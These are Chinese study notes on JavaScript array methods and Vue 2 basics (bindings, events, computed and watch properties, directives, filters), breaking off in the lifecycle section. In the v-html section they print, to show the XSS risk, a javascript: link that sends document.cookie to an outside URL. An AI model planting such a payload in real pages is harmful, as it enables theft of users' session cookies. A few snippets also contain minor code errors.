## 准备工作

bootcdn 下载我们需要的vue.js

![image-20210816065432198](C:\Users\q\AppData\Roaming\Typora\typora-user-images\image-20210816065432198.png)

```javascript
    <!-- 补充一个时间日期转换的第三方库 -->
   <!-- <script src="https://cdn.bootcdn.net/ajax/libs/moment.js/2.29.1/locale/af.js"></script> -->
    <!-- 更轻量级 -->
   <script crossorigin="anonymous" src="https://cdn.bootcdn.net/ajax/libs/dayjs/1.10.6/dayjs.min.js"></script>
```



编辑器 vs code

​     并且下一个插件 live server 这样当前目录就是一个小新的服务器

    ### 数组的常用10方法

#### 1. unshift

>往数组头部追加一个元素，返回新的长度

```javascript
var arr = [1,2,3];
arr.unshift(7);
console.log(arr);//[7,1,2,3]
```

#### 2. shift

>把数组头部第一个元素删掉，返回这个元素

```javascript
var arr = [1,2,3];
arr.shift();
console.log(arr);//[2,3]
```

#### 3. pop

>把数组尾部元素删除，返回这个元素

```javascript
var arr = [1,2,3];
arr.pop();
console.log(arr);//[1,2]
```

#### 4. push

>往数组尾部追加一个元素

```javascript
var arr = [1,2,3];
arr.push(7);
console.log(arr);//[1,2,3,7]
```

#### 5. sort

>对数组的元素进行排序，可选参数：传入函数，按照一定规则排序。
>
>传入的函数，有一个返回值，
>
>​               返回值 >0  升序，小的在前面 
>
>​               返回值 <0  降序，大的在前面    

```javascript
//TODO 对于字符串是数字，通过sort()排序无效
//定义排序函数
function sortNumber(a,b){
     //a-b升序  b-a降序
     return a - b
}

var arr = new Array();
arr[0] = "10"
arr[1] = "5"
arr[2] = "40"
arr[3] = "25"
//可以输出 html代码，也可以是js
document.write(arr + "<br />");// ["10","5","40","25"]
document.write(arr.sort(sortNumber)); // 
```

#### 6. reverse

>颠倒数组的顺序

```javascript
var arr = [1,3,4];
arr.reverse();
console.log(arr);// [4,3,1]
```

#### 7. slice

>slice( start , end )     从start索引开始，到end-1索引剪切  不包括end索引，返回一个新数组

```javascript
var arr = [1,2,3,4,5];
arr = arr.slice(1,2); //从索引1开始，到索引1
console.log(arr);//[1] 
```

#### 8. concat

>用于连接2个或多个数组。不改变原数组

```javascript
var arr = [1];
var arr2 = [2];
var arr3 = [3];
var newArr = arr.concat(arr2,arr3);
console.log(newArr); // [1,2,3]
```

#### 9. join

>把数组的所有元素放入到一个字符串中，通过指定的字符分割。 返回一个字符串

```javascript
var arr = [1,2,3];
var s = arr.join(); //默认通过,分割
cosole.log(s); // "1,2,3"
```

#### 10. splice

>从数组中添加/删除项目，然后返回被删除的项目。改变原数组
>
>第一个参数：索引开始位置
>
>第二个参数：>0表示删除几个
>
>第n个参数：放入的元素，如果该索引位置有值就替换

```javascript
var arr = [1,3,5,7,9];
//从索引1开始，不删除，添加一个元素66
arr.splice(1,0,66);
console.log(arr); //[1,66,5,7,9]
//从索引2开始，删除2个，不添加元素
arr.splice(2,2);
console.log(arr);//[1,66,7,9]
```

#### 11. length属性

>输出 数组的长度

#### 12. split (字符串的拆分方法)

>传入字符，按这个形式拆分，返回一个数组

```javascript
var s = "1-2-3-4";
var arr = s.split("-");
console.log(arr); //[1,2,3,4] 
```

#### 13. toString  ||  toLocalString

>将 数组 转成 字符串 输出，并返回结果。
>
>toLoalString，通过特定,将 数组转成字符串输出。

#### 14. valueOf(忽略)

>返回数组对象的原始值，默认调用。

### 数组过滤器 filter

```javascript
var arr = [1,2,3,4,5,2];
arr = arr.filter( (a)=>{ 
      //true代表要 
      return a==2;
   }
);
console.log(arr); // [2,2]
```





## ①基础

### 1.创建一个Vue实例

​    <head>标签中引入 vue.js  可以使用官方的地址，或者下载下来，建议下载下来，这样没有网络也可以使用

```javascript
<!-- 引入官网的vue.js -->
<script src="https://cdn.bootcdn.net/ajax/libs/vue/3.2.0-beta.7/vue.cjs.js"></script>   

<!-- 引入本地的vue.js,下面的路径仅供参考(因为每个人的这个地址不相同) -->
<script type="text/javascript" src="../../js/vue.js"></script>
```

#### 核心代码

![image-20210816070534567](C:\Users\q\AppData\Roaming\Typora\typora-user-images\image-20210816070534567.png)

#### 效果图

![image-20210816070638309](C:\Users\q\AppData\Roaming\Typora\typora-user-images\image-20210816070638309.png)

#### vue创建实例解释

>   运行流程：先有div容器，再用vue实例，解析容器，扫描有没有特殊vue语法，有就替换(wly替换{{name}})
>
>    容器的作用：提供vue模板，以及告诉vue把内容往哪放
>
>    特点：1个vue实例只能接管1个容器，1个容器只能对应1个vue实例，只能1对1对应
>
> ​              vue实例配合着组件使用 {{}} 中可以拿到data所有中的属性，一旦data的属性改变，界面也会改变
>
>    {{}}：里面只能写js表达式，后续统一用 “插值语法” 这个名称

#### 1.1el和data的两种写法

##### 1.1.1 el的两种写法

>① 初始化时通过 el绑定容器
>
>② 后续通过vue实例对象  <b>$mount() </b>  绑定容器

```javascript
<script>
    //创建vue实例
    const vm = new Vue({
        // el: '#root', //第一种写法
    });
    //设置一个定时器
    setTimeout(()=>{
        //拿到Vue原型里的mount,设置容器对象  第二种写法
        vm.$mount('#root');
    },2000);
</script>
```

##### 1.1.2 data的两种写法

>①对象式    data{}
>
>②函数式   data(){ return {} }
>
>

```javascript
<script>
    const vm = new Vue({
         el:'#root',
         //data的第一种写法：对象式
         /* data:{
             name:'wly'
         } */
         //data的第二种写法：函数式
         //data的简写版本： data:function(){}      data(){} 
         //箭头函数的data   data:()=>{}
         data:function(){
            //此处的this是vue实例
            console.log(this);
            return {
                name:'wly'
            }
         }
         //todo 细节：由vue管理的函数不能使用箭头式函数，this不再是vue实例，this代表window对象 
         //因为箭头函数会往上一级找 
    });
</script>
```



#### 1.2.v-bind 单向绑定属性

##### 核心代码

![image-20210816071151229](C:\Users\q\AppData\Roaming\Typora\typora-user-images\image-20210816071151229.png)

##### 效果图

![image-20210816071404675](C:\Users\q\AppData\Roaming\Typora\typora-user-images\image-20210816071404675.png)

##### 特点

> v-bind:某个属性=" 插值语法 "                简写     :某个属性=" 插值语法 "     
>
> 支持绑定所有的属性，但是只能单向绑定。修改数据源才能改变界面。（也就是Model改变View，后续MVVM模型说明）

##### 默写

> v-bind:x="插值语法"    【简写】      :x="插值语法"         单向绑定
>
> 

#### 1.3.v-moel双向数据绑定

>不是所有的属性都可以绑定，只有form表单中的标签 ，只绑定value属性
>
>比如：输入框，复选款，单选框

##### 核心代码

![image-20210816071726453](C:\Users\q\AppData\Roaming\Typora\typora-user-images\image-20210816071726453.png)

##### 效果图

​    ![image-20210816071828118](C:\Users\q\AppData\Roaming\Typora\typora-user-images\image-20210816071828118.png)

##### 演示错误的写法效果图

​     第一步：将之前的注释的‘错误写法’注释开

​     报错显示：不支持的元素类型，是这个x![image-20210816071956600](C:\Users\q\AppData\Roaming\Typora\typora-user-images\image-20210816071956600.png)

##### 特点

>  v-model 双向绑定：数据源改变，界面改变 ； 界面内容改变，数据源改变
>
>  v-model:value     简写成    v-model="插值语法"       因为v-model都是和value属性绑定
>
>  缺点：不是所有属性都可以绑定，只能绑定value属性，只有与用户可以与之交互的才可以，
>
> ​            比如表单的输入框,单选框,复选款....都有value属性
>
> 

##### 默写

> v-model:value="插值语法"    【简写】   v-model="插值语法"     双向绑定
>

#### 1.4MVVM模型

>M :   model  模型
>
>V  :   view   视图        
>
>VM : viewModel 视图模型 

##### 效果图 

![image-20210823071623850](C:\Users\q\AppData\Roaming\Typora\typora-user-images\image-20210823071623850.png)

##### 核心代码

```javascript
<body>
    <!--  View -->
    <div id="root">
        <p>{{name}}</p>
    </div>
</body>
<script>
    Vue.config.productionTip=false;
    const vm = new Vue({ //Vue实例vm就是 ViewModel
        el:'#root',
        //M模型（Model），对应data中的数据
        //V视图(View)，模板
        //VM视图模型(ViewModel)，Vue实例对象
        data:{ // Model 
            name:'wly',
            a:1
        }
    })
    console.log(vm);
</script>
```

### 2.引入Vue数据代理

#### 2.1 Object.defineProperty

>Object.defineProperty  对于属性的操作：如增加，修改

```javascript
<script>
    let person = {
        name: 'wly',
        //age: 18
    };
    console.log('修改前',person);

    //增加属性  （因为没有age属性，有就是修改属性）
    Object.defineProperty(person, 'age', {
        value: 18,
        //控制属性的操作
        enumerable: true, //可枚举的
        writable: true, //可修改的
        configurable: true, //可删除的
    });
    console.log('修改后',person);
    console.log("--------------------")
    //遍历获取所有的keys，输出成一个数组
    console.log(Object.keys(person));
    //通过map遍历数组，一般是做一些处理
    Object.keys(person).map((value, index, arr) => {
         console.log("key:"+key + " @" + index+" value@"+person[key]) // 获取到属性对应的值，做一些处理
    })
    console.log("--------------------")
    //遍历取出person的值
    for (let v in person) {
        console.log(person[v]);
    };
</script>
```

##### 效果图

![image-20210823074823893](C:\Users\q\AppData\Roaming\Typora\typora-user-images\image-20210823074823893.png)

#### 2.2 原生实现双向数据修改

 ##### 核心代码

```javascript
<script>
    //全局的变量
    let number = 0;
    let person = {
        name: 'wly',
        // age:18
    }; 
    //整体实现双向的数据修改,修改number完成对 person.age的修改
    Object.defineProperty(person, 'age', {
        //当读取person.age属性时，get函数被调用，返回age的值
        //意味着number改变，返回值改变，即person.age改变
        get:function(){
            console.log("有人读取");
            return number;
        },
        //当设置person.age属性时，set函数被调用，会受到修改的具体值
        //意味着，当person.age改变，则number改变
        set:function(value){
            console.log("有人修改value的值，值是"+value);
            number = value;
        }     
    });
</script>
```

#### 2.3.何为数据代理

##### 核心代码

```javascript
<script>
    //数据代理，就是通过一个对象，代理对另一个对象的属性  读/写操作
    Vue.config.productionTip=false;
    let obj = {x:12};
    let obj2 = {y:2};
    //控制obj2.x属性,实际修改的是obj.x属性   ===>   obj2代理obj的x属性
    Object.defineProperty(obj2,'x',{
         get:function(){
            return obj.x;
         },
         set:function(value){
            obj.x=value;
         }
    })
</script>
```

#### 2.4 Vue的数据代理

>代理 _data 

##### 图解

![image-20210823080100131](C:\Users\q\AppData\Roaming\Typora\typora-user-images\image-20210823080100131.png)

##### 核心代码

```html
<body>
    <div id="root">
        <!-- vue做了代理，不用通过_data带出属性也可以 -->
        <p>{{name}}, {{_data.name}}</p>
        <p>{{address}}</p>
    </div>
</body>
<script>
    Vue.config.productionTip=false;
    let data = {
        name: 'wly',
        address: 'beijing'
    };
    //vm._data属性就是取得 data属性
    //证明vm.name 取得就是 data中的数据
    //数据驱动视图：修改data数据，视图改变
    const vm = new Vue({
         el:"#root",
         data  //data是简写  实际是 data:data  后者data是变量对象data
    });
</script>
```

###### 效果图

![image-20210823080305773](C:\Users\q\AppData\Roaming\Typora\typora-user-images\image-20210823080305773.png)



##### $特别说明：data和_data

>data可以暂时理解成和_data一样
>
>data中的数据，实际就是 _data来取
>
>当然data可以不写，因为vue代理了
>
>​       例子  vm是Vue实例哈，  vm.name === vm._data.name



### 3.事件处理

#### 3.1 v-on:click    @click  

```html
<body>
    <div id="root">
        <!-- 绑定点击事件  v-on:click   简写 @click-->
        <h2>{{name}}</h2>
        <!-- TODO 默认传入event事件对象 -->
        <button v-on:click="showInfo">点我提示信息</button>
        <!-- 传入event -->
        <button @click="showInfo2(66,$event)">点我提示信息2</button>
    </div>
</body>
<script>
    Vue.config.productionTip=false;
    //vue实例
    const vm = new Vue({
        el:'#root',
        //做数据劫持，数据代理
        data:{
            name:'wly'
        },
        //配置事件回调
        methods:{
            //不写箭头函数，箭头函数的话this就表示是window对象
            showInfo(event){
              alert('你好！');
              console.log(event.target.innerText);
              //this代表vue实例
              console.log(this);
            },
            showInfo2(number,event) {
                alert('你好！！'+number);
                console.log(event.target.innerText);
                //this代表vue实例
                console.log(this);
            },
        }
    })
</script>
```

#### 3.2 click事件修饰符

##### 3.2.1 prevent 阻止默认事件

###### 3.2.1.1核心代码

```html
 <!-- 1.阻止默认事件(常用) prevent -->
<a href="http://www.baidu.com" @click.prevent="click">点我</a>
```



###### 3.2.2 stop 阻止冒泡事件

>这里如果不加，我们点击div中的按钮，就会先触发button的点击事件
>
>然后继续往上冒泡，找父亲，然后也触发了点击事件
>
>但是最后event事件对象 都是button

###### 3.2.2.1核心代码

```html
<div class="demo1" @click="click">
    <!-- 2.阻止冒泡事件(常用) stop -->
    <button @click.stop="click">点我提示信息</button>
     <!-- 修饰符可以连续写 -->
</div>
```



##### 3.2.3 noce 只触发一次事件

###### 3.2.3.1核心代码

```html
<!-- 第一次点击会触发click函数，后续点击不会触发了 -->
<button @click.once="click">点我提示信息</button>
```



#### 3.3键盘事件

##### 3.3.1keyup事件

>键盘按下还得弹起来才触发事件

##### 3.3.2kedown事件

>键盘按下就触发事件

##### 3.3.3对应键位事件

>Enter表示按下回车 
>
>space空格 
>
>delete删除或者退格 
>
>tab 换行 
>
>up上 down下 left左 right右
>
>caps-lock 表示大小写

###### 核心代码

```html
<body>
    <div id="root">
         <p>{{name}}</p>
         <!--1. keydown按下就触发  keyup 按下还得松开触发 -->
         <!--2. Enter表示按下回车 space空格  delete删除或者退格  tab 换行 up上 down下 left左 right右 caps-lock 表示大小写
        -->
        <!--3. @keyup.enter表示 按下回车 触发事件 -->
        <input type="text" placeholder="按下回车提示输入" @keyup.enter="showInfo"></input>
        <!-- 4.tab表示换行，按下键位还没弹起就触发了，得配合keydown使用，
            因为按下tab,已经换行了，keyup事件是要弹起时触发，而现在光标已经跑到别的地方了，不在当前输入框中了，无法触发keyup事件
            系统修饰键：ctrl alt shift meta(win键) 4个特殊的
            1)配合keyup,需要配合其他键，如crlt+c 触发keyup事件
            2)配合keydown,就是正常使用
        -->
        <!-- 给enter键位(键数字13)，设置了别名huiche,后续通过huiche调用enter触发 (不推荐) -->
        <input type="text" placeholder="按下回车提示输入" @keyup.huiche="showInfo"></input>
    </div>
</body>
<script>
    Vue.config.productionTip=false;//是否生成生产提示
    //5.定义别名按键 （不推荐）
    Vue.config.keyCodes.huiche=13;
    const vm = new Vue({
         el:'#root',
         data:{
             name:'wly'
         },
         methods:{
             //默认传入event事件对象
             showInfo(event){
                 //第一种通过按键编码判断,13表示回车
                 /* if(event.keyCode!=13){
                     return;
                 } */
                 //打印按键名称，编码
                 console.log(event.key,event.keyCode);
                 //打印输入框的值
                //console.log(event.target.value);
             }
         }
    });
</script>
```





### 4.计算属性 computed

#### 4.1核心代码

```html
<body>
    <div id="root">
        姓:<input type="text" v-model:value="firstName"><br>
        名:<input type="text" v-model="lastName"><br>
        <!-- 
            事件的时候，方法带不带()都可以  
            插值语法时，方法不带()，表示一个函数, 带()表示调用函数
       -->
        <!-- 计算属性 -->
        全名:<span>{{fullName}}</span>
    </div>
</body>
<script>
    Vue.config.productionTip = false; //阻止vue启动时生成生产提示
    const vm = new Vue({
        //绑定容器
        el: '#root', 
        //存放数据
        data: {
            firstName: "张",
            lastName: "三"
        },
        //存放方法
        methods: {
        },
        //存放计算属性(会缓存)
        computed: {
           //定义了一个属性,里面的方法是设置属性的（细节：这不是定义了对象，而是一个属性）
           fullName: {
                //当有人读取fullName,get()会被调用，并将返回值作为fullName的值 
                //get什么时候被调用？1.初次读取时 2.所依赖的数据发生变化时,也就是firstName,lastName呗修改时就会调用
                get() {
                   console.log('get被调用',this);
                   return this.firstName+"-"+this.lastName;
                },
               //当有人修改fullName，set()会被调用
               //修改fullName所以来的数据就会调用 
               set(value){
                   console.log('set',value);
                   const arr =value.split("-");
                   this.firstName = arr[0];
                   this.lastName = arr[1];
                } 
            }
        }
    });
</script>
```

#### 简写形式:只有get读取

```javascript
//简写形式，只有get读取  注意：这是属性
fullName(){
     return this.firstName + "-" + this.lastName;
}
```

### 5.监视属性 watch

#### 5.1核心代码(2种写法)

```html
<body>
    <!-- 定义一个容器，里面是模板 -->
    <div id="root">
        <h2>今天是否很{{info}}</h2>
        <button @click="changeWeather">切换天气</button>
    </div>
</body>
<script>
    Vue.config.productionTip = false;
    const vm = new Vue({
        el: '#root',
        data: {
            isHot: true,
        },
        methods: {
            changeWeather() {
                this.isHot = !this.isHot;
            }
        },
        //存放计算属性
        computed: {
            //简写属性，只有get()读取方法
            info() {
                return this.isHot ? '炎热' : '凉爽';
            }
        },
        //监视
        watch: {
            //监视isHot属性   注意：监视可以是data中的属性，以及computed计算属性
            isHot: {
                //表示立即执行，初始化时让handler调用一下
                immediate:true,
                //当isHot发生改变时调用handler()
                //返回现在值，原来值
                handler(newValue, oldValue) {
                    console.log("改变", newValue, oldValue);
                }
            }
        }
    });

    //第二种方式，写监视 ; 但不知道监视谁时，推荐这种
    //为什么加引号'',是因为属性都是'属性名'，只是简化了而已
    /* vm.$watch('isHot', {
        //表示立即执行，初始化时让handler调用一下
        immediate: true,
        //当isHot发生改变时调用handler()
        //返回现在值，原来值
        handler(newValue, oldValue) {
            console.log("改变", newValue, oldValue);
        }
    }); */
</script>
```

#### 5.2初始化立即监视执行

>immediate: true

#### 默写

```html
[监视的属性名]: {
       //表示立即执行
       immediate:true,
       //深度监视
       deep:true,
       //当isHot发生改变时调用handler()
       handler(newValue, oldValue) {
            
       }
}
```

#### 5.3深度监视

##### 为什么要有深度监视?

>对于对象，它使用的是 引用地址 !!! 
>
><b>只要引用地址不改变，那么就不算改变，那么就监视不到内部的数据变化。</b>
>
>举例:   var p = { name : 'wly'};
>
>​           p.name='WLY';  
>
>上述例子是否可以被监视？  NO

##### 开启深度监视 deep:true

>deep:true

#### 简写形式

```jva
[监视的属性名](newValue, oldValue) {
     
}
```



### 6.条件渲染

#### 6.1 v-show

>控制界面元素的  显示和隐藏，适合变化频繁

```html
 <h2 v-show="a">欢迎,{{name}}!</h2>
```

#### 6.2 v-if   v-else-if   v-else 

>控制界面元素的 存在与否，不适合变化频繁

```html
<!-- 配合模板:不破坏结构，配合v-if使用   -->
<template>
         <h2 v-if="true">temp1</h2>
         <h2 v-else-if="false">temp2</h2>
         <h2 v-else>其他temp</h2>
</template>
```

### 7.列表渲染

#### 7.1例子

```html
<body>
    <div id="root">
        <!-- 遍历数组（用的最多） -->
        <h2>人员列表-遍历数组</h2>
        <ul>
            <!-- 如果没有写key,默认写了 :key="index" -->
            <li v-for="(p,index) in persons" :key="p.id">
                姓名:{{p.name}},年龄:{{p.age}},索引:{{index}}
            </li>
        </ul>
        <!-- 遍历对象， key就是对象的属性名，value就是属性值 -->
         <h2>人员列表-遍历对象</h2>
         <ul>
             <li v-for="(value,key) in car" :key="key">
                 {{key}}-{{value}}  
             </li>
         </ul>
    </div>
</body>
<script>
    Vue.config.productionTip = false;
    const vm = new Vue({
        el: '#root',
        data: {
          persons:[
             {id:'001',name:'张三',age:12,},
             {id:'002',name:'李四',age:13 },
             {id:'003',name:'王五',age:18}
          ],
          car:{
              name:'奥迪A6',price:1000000
          }
        }
    });
```

#### 7.2Vue的set方法

>不能给data直接追加属性，只能往data中的对象追加！！！

```javascript
 const vm = new Vue({
        el: '#root',
        data: {
            name: 'wly',
            address: '北京',
            student: {
                name: 'tom',
                age: 10,
                firends: [{
                        name: 'dog',
                    },
                    {
                        name: 'cat',
                    },
                ]
            },
        }
    });

   //todo 后期手动给data中添加属性 _data可以省略
   Vue.set(vm._data.student,'sex','男'); //方式1
   vm.$set(vm._data.student,'sex','女'); //方式2
   
   //TOOD 局限性：只能给data中的 某一个对象属性 追加，但是不能给data中加!!! 
```

#### 7.3Vue的数据检测

>检测的是数据的地址，对于数组，只要修改了数组，就会检测到。
>
>但是对于对象的检测，只有对象的引用地址改变才会被检测！！！
>
>Vue的set()也是会被检测的！！！



### 8.收集表单数据 

#### 8.1核心代码

```html
<!-- 
	收集表单数据：
		若：<input type="text"/>， 则v-model收集的是value值，用户输入的就是value值。
		若：<input type="radio"/>，则v-model收集的是value值，且要给标签配置value值。
		若：<input type="checkbox"/>
				1.没有配置input的value属性，那么收集的就是checked（勾选 or 未勾选，是boolean布尔值）
				2.配置input的value属性:
						(1)v-model的初始值是非数组，那么收集的就是checked（勾选 or 未勾选，是布尔值）
						(2)v-model的初始值是数组，那么收集的的就是value组成的数组
		备注：v-model的三个修饰符：
							lazy：  输入框失去焦点再收集数据
							number：输入字符串转为有效的数字
						    trim：   输入首尾空格过滤
          
         总结：v-model收集的是value值，不能输入的要设置value值
-->
<body>
    <div id="root">
        <form @submit.prevent="demo">
            <!-- 去除头尾空格 -->
            账号：<input type="text" v-model.trim="userInfo.account"><br>
            密码：<input type="password" v-model="userInfo.password"><br>
            <!-- v-model.number设置age属性接收的是数字类型，不然输入的默认是字符串-->
            年龄：<input type="number" v-model.number="userInfo.age"><br>
            性别：
            <!-- 不能输入的得设置value属性 -->
            男:<input type="radio" name="sex" value="0" v-model="userInfo.sex">
            女:<input type="radio" name="sex" value="1" v-model="userInfo.sex"> <br>
            爱好：
            <!-- 复选款，得数组接收 -->
            学习<input type="checkbox" value="aihao" v-model="userInfo.hobby">
            打游戏<input type="checkbox" value="youxi" v-model="userInfo.hobby">
            吃饭<input type="checkbox" value="chifan" v-model="userInfo.hobby"><br>
            所属校区：
            <!-- 下拉框v-model绑定 -->
            <select v-model="userInfo.city">
                <option value="">请选择校区</option>
                <option value="bj">北京</option>
                <option value="sh">上海</option>
            </select>
            <br>
            其他信息：
            <!-- lazy 失去焦点获取输入的数据 -->
            <textarea v-model.lazy="userInfo.other"></textarea>
            <br>
            <input type="checkbox" v-model="userInfo.agrea">
            阅读并接收<a href="javascript:0;">《用户协议》</a>
            <br>
            <button>提交</button>
        </form>
    </div>
</body>
<script>
    Vue.config.productionTip = false;
    new Vue({
        el: '#root',
        data: {
            userInfo: {
                account: '',
                password: '',
                age: '',
                sex: '0',
                hobby: [], //复选款，得数组接收
                city: 'bj',
                other: '',
                agrea: ''
            }
        },
        methods: {
            demo() {
                console.log(this._data);
            }
        }
    });
</script>
```



### 9.过滤器 filters

#### 9.1格式

><h3> {{    属性名 |  过滤器1 |  过滤器2... }}</h3>
>
>不能配合v-model使用！！！
>
>//如下是js的部分代码
>
>filters {
>
>​     //str=""  是es6的语法，如果str为空，那么就按默认的来
>
>​    [过滤器名] (value, str="YYYY-MM-DD HH:mm:ss"){
>
>​    } 
>
>} 

#### 9.2局部/全局过滤器

```html
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>过滤器</title>
    <!-- 这是本地的js,可以通过cdn引入 -->
    <script src="../../js/vue.js"></script>

    <!-- <script src="https://cdn.bootcdn.net/ajax/libs/moment.js/2.29.1/locale/af.js"></script> -->
    <!-- 更轻量级 -->
    <script crossorigin="anonymous" src="https://cdn.bootcdn.net/ajax/libs/dayjs/1.10.6/dayjs.min.js"></script>
</head>

<body>
    <div id="root">
        <h2>显示格式化后的时间</h2>
        <h3>{{fmtTime}}</h3>
        <h3>{{fmtTimeMethod()}}</h3>
        <hr>
        <h2>过滤器实现</h2>
        <!-- 过滤器实现： 正常属性 | 过滤器名
             过滤器默认第一个参数就是前面的参数，所以不用传
             用于：插值语法   v-bind
             语法: {{xxx | 过滤器名}}  或  v-bind属性 = "xx | 过滤器名"
             过滤器可以串联，不改变原始数据，默认第一个参数接收的是|前的
        -->
        <h3>{{time | timeFormater}}</h3>
        <h3>{{time | timeFormater()}}</h3>
        <h3>{{time | timeFormater('YYYY年MM月DD日')}}</h3>
        <!-- 多个过滤器的串联 -->
        <h3>{{time | timeFormater('YYYY年MM月DD日') | mySlice}}</h3>
    </div>
    <hr>
    <div id="root2">
        <h2>{{name | mySliceAll}}</h2>
        <h3 :x="name | mySliceAll">{{name}}</h3>
        <!-- 不能配合 v-model使用 -->
    </div>
</body>
<script>
    Vue.config.productionTip = false;

    //全局过滤器，
    Vue.filter('mySliceAll', function (value) {
        return value.slice(0, 4);
    });
    const vm = new Vue({
        el: '#root',
        data: {
            time: 1629029218007, //时间戳
        },
        //存放计算属性
        computed: {
            fmtTime() {
                console.log(new Date().getTime());
                return dayjs(this.time).format('YYYY-MM-DD HH:mm:ss');
            }
        },
        //存放方法
        methods: {
            fmtTimeMethod() {
                return dayjs(this.time).format('YYYY-MM-DD HH:mm:ss');
            }
        },
        //定义过滤器，局部的,只能当前vue实例使用
        filters: {
            //第一个参数:时间戳，第二个参数：时间格式
            //str='..'的写法是Es6的，如果Str为空，那么就是按照这个值来
            timeFormater(value, str = 'YYYY-MM-DD HH:mm:ss') {
                console.log("@", value);
                return dayjs(this.time).format(str);
            },
            mySlice(value) {
                return value.slice(0, 4);
            }
        }
    });

    const vm2 = new Vue({
        el: '#root2',
        data: {
            name: 'hello wly!',
        }
    })
</script>
```



### 10.内置指令

#### 10.1 v-text指令

>渲染文本内容

##### 核心代码

```html
<div id="root">
   <h2 v-text="name">写了和没写一样，只显示v-text的文本内容</h2>
</div>
<script>
const vm = new Vue({
        el: '#root',
        data: {
            name: 'wly'
        }
    });
</script>
```

#### 10.2 v-html指令

>渲染包括html内容
>
>弊端：v-html有严重的安全性问题，容易导致XSS攻击

##### 核心代码

```html
<div id="root">
   <h2 v-html="msg">写了和没写一样</h2>
</div>
<script>
 const vm = new Vue({
    el:'#root',
    data:{
        //跳转的地址可能是个不好的地址，比如恶意网址，它拿到我们的cookie
        msg:'<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>点我</a>'
    }
 });
</script>
```

#### 10.3 v-cloak指令

>解决网速慢的时候，未经解析的东西比如{{name}}插值语法， 会先显示{{name}}，然后过一会才刷新
>
>这个的话只有当插值语法的内容渲染时才会显示，未被渲染时内容不显示。

##### 核心代码

```html
<style>
        /* 属性选择器 */
        [v-cloak]{
           display: none;
        }
</style>

<div id="root">
    <!-- 当网速过慢时，正常会先显示{{name}}，然后渲染完显示wly 
          加上这个，设置属性，表示开始时是不显示的，只有渲染了才会显示！     
    -->
    <h2 v-cloak>{{name}}</h2>
</div>

<script>
const vm = new Vue({
    el:'#root',
    data:{
        name:'wly'
    }
});
</script>
```

#### 10.4 once指令

>表示初次渲染是动态内容，后续内容改变，不会再改变了，变成静态内容

##### 核心代码

```html
 <div id="root">
       <!-- 初次渲染后，就是静态内容，以后数据的改变不会影响v-once的结构更新 
            第一次动态渲染1,后面点击按钮不会再改变n的值
       -->
       <h2 v-once>初始化的n值是:{{n}}</h2>
       <button v-on:click="addN">点我n++</button>
</div>
<script>
const vm = new Vue({
    el:'#root',
    data:{
       n:1   
    },
    methods:{
        addN(){
            this.n++;
        }
    }
})
</script>
```



#### 10.5 v-pre指令

>告诉Vue不要渲染，跳过它。

##### 核心代码

```html
<div id="root">
    <!--告诉Vue不要渲染，跳过它，那么显示的内容 {{name}}-->
    <h2 v-pre>{{name}}</h2>
</div>
<script>
    const vm = new Vue({
        el:'#root',
        data:{
            name:'wly'
        }
    });
</script>
```



### 11.自定义指令 directive(s)

 >全局指令通过 directive   所有的vue实例都可以使用
 >
 >局部指令通过 directives 只有当前vue实例可以使用

#### 11.1全局指令

```html
<div id="root">
    <button @click="n++">点我n+1</button>
    <hr>
	<input type="text" v-fbind:value="n">
</div>
<script type="text/javascript">
		//定义全局指令
		Vue.directive('fbind',{
			//指令与元素成功绑定时（一上来）
			bind(element,binding){
				element.value = binding.value
			},
			//指令所在元素被插入页面时
			inserted(element,binding){
                 //获取焦点
				element.focus()
			},
			//指令所在的模板被重新解析时
			update(element,binding){
				element.value = binding.value
			}
		})
</script>
```

#### 11.2局部指令(记)

>两种方式：①函数式   
>
>​                 ②对象式(更强大,自带3个函数设置)    bind刚开始绑定时   inserted插入元素时    update重新解析时

```html
<body>
		<!-- 
				需求1：定义一个v-big指令，和v-text功能类似，但会把绑定的数值放大10倍。
				需求2：定义一个v-fbind指令，和v-bind功能类似，但可以让其所绑定的input元素默认获取焦点。
				自定义指令总结：
						一、定义语法：
									(1).局部指令：
												new Vue({									   new Vue({
													directives:{指令名:配置对象}   或   		        directives{指令名:回调函数}
												}) 												})

						二、配置对象中常用的3个回调：
									(1).bind：指令与元素成功绑定时调用。
									(2).inserted：指令所在元素被插入页面时调用。
									(3).update：指令所在模板结构被重新解析时调用。

						三、备注：
									1.指令定义时不加v-，但使用时要加v-；
									2.指令名如果是多个单词，要使用kebab-case命名方式，不要用camelCase命名。
		-->
		<!-- 准备好一个容器-->
		<div id="root">
			<h2>当前的n值是：<span v-text="n"></span> </h2>
			<h2>放大10倍后的n值是：<span v-big="n"></span> </h2>
			<button @click="n++">点我n+1</button>
			<hr/>
			<input type="text" v-fbind:value="n">
		</div>
	</body>
	
	<script type="text/javascript">
		Vue.config.productionTip = false
		new Vue({
			el:'#root',
			data:{
				name:'尚硅谷',
				n:1
			},
			//自定义指令,只能vue实例使用
			directives:{
                 //TODO 第一种：自定义指令-函数式
				//big函数何时会被调用？
				//   1.指令与元素成功绑定时（一上来）。
				//   2.指令所在的模板被重新解析时。
				//element是被使用该指令的真实dom元素，
				//简写操作就是只有bind()和update()区域，没有inserted()区域
				big(element,binding){
					//console.log('big',this) //注意此处的this是window
					element.innerText = binding.value * 10
				},
				//TODO 第二种：自定义指令-对象式
				fbind:{
					//TODO 这三个函数成为钩子
					//指令与元素成功绑定时（一上来）
					bind(element,binding){
						console.log(binding,binding.value);
						console.log(element,element.value);
						element.value = binding.value;
					},
					//指令所在元素被插入页面时调用
					inserted(element,binding){
						//获取鼠标焦点
						element.focus();
					},
					//指令所在的模板被重新解析时调用
					update(element,binding){
						//bind和update的逻辑是一样的
						element.value = binding.value;
						element.focus();
					}
				}
			}
		})
		
	</script>
```



### 12.Vue的生命周期

>生命周期，别名也叫生命周期钩子

#### 12.1核心代码

```html
<body>
	<!-- 准备好一个容器-->
	<div id="root" :x="n">
		<h2 v-text="n"></h2>
		<h2>当前的n值是：{{n}}</h2>
		<!-- 这个事件点击，是dom原生事件监听，是没有办法撤销的，所以点击还是会调用add() -->
		<button @click="add">点我n+1</button>
		<button @click="bye">点我销毁vm</button>
	</div>
</body>

<script type="text/javascript">
	Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

	const vm = new Vue({
		el: '#root',
		//如果div容器中什么都没有，可以通过template定义，但是会替换原div容器，下面这个就是div容器
		/* template:`
			<div>
